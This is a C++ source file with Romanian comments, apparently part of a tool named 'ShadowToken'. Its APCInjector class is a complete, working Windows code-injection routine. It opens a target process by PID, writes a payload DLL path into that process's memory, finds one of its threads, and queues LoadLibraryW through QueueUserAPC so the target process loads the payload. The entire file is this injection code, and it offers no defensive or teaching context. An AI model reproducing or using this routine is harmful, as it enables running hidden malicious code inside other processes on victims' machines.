#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>

namespace ShadowToken {

    class APCInjector {
    public:
        // Execută injecția APC într-un proces specificat prin PID
        bool InjectAPC(DWORD processID, const std::wstring& payloadPath) {
            HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
            if (!processHandle) {
                std::cerr << "[Error] Nu s-a putut deschide procesul: " << GetLastError() << std::endl;
                return false;
            }

            // Încarcă payload-ul în memoria procesului țintă
            LPVOID remoteBuffer = VirtualAllocEx(processHandle, nullptr, payloadPath.size() * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!remoteBuffer) {
                std::cerr << "[Error] Nu s-a putut aloca memorie în procesul țintă: " << GetLastError() << std::endl;
                CloseHandle(processHandle);
                return false;
            }

            if (!WriteProcessMemory(processHandle, remoteBuffer, payloadPath.c_str(), payloadPath.size() * sizeof(wchar_t), nullptr)) {
                std::cerr << "[Error] Nu s-a putut scrie payload-ul în memoria procesului țintă: " << GetLastError() << std::endl;
                VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
                CloseHandle(processHandle);
                return false;
            }

            // Găsește un thread activ în procesul țintă
            HANDLE threadHandle = FindThread(processID);
            if (!threadHandle) {
                std::cerr << "[Error] Nu s-a putut găsi un thread activ în procesul țintă." << std::endl;
                VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
                CloseHandle(processHandle);
                return false;
            }

            // Adaugă payload-ul la coada APC a thread-ului
            if (QueueUserAPC((PAPCFUNC)LoadLibraryW, threadHandle, (ULONG_PTR)remoteBuffer) == 0) {
                std::cerr << "[Error] Nu s-a putut adăuga payload-ul în coada APC: " << GetLastError() << std::endl;
                VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
                CloseHandle(threadHandle);
                CloseHandle(processHandle);
                return false;
            }

            std::cout << "[Info] Injecția APC a fost realizată cu succes." << std::endl;

            // Cleanup
            CloseHandle(threadHandle);
            CloseHandle(processHandle);
            return true;
        }

    private:
        // Găsește un thread activ în procesul țintă pentru a injecta payload-ul
        HANDLE FindThread(DWORD processID) {
            HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (snapshot == INVALID_HANDLE_VALUE) return nullptr;

            THREADENTRY32 threadEntry;
            threadEntry.dwSize = sizeof(THREADENTRY32);

            HANDLE threadHandle = nullptr;
            if (Thread32First(snapshot, &threadEntry)) {
                do {
                    if (threadEntry.th32OwnerProcessID == processID) {
                        threadHandle = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, threadEntry.th32ThreadID);
                        if (threadHandle) break;
                    }
                } while (Thread32Next(snapshot, &threadEntry));
            }

            CloseHandle(snapshot);
            return threadHandle;
        }
    };
}
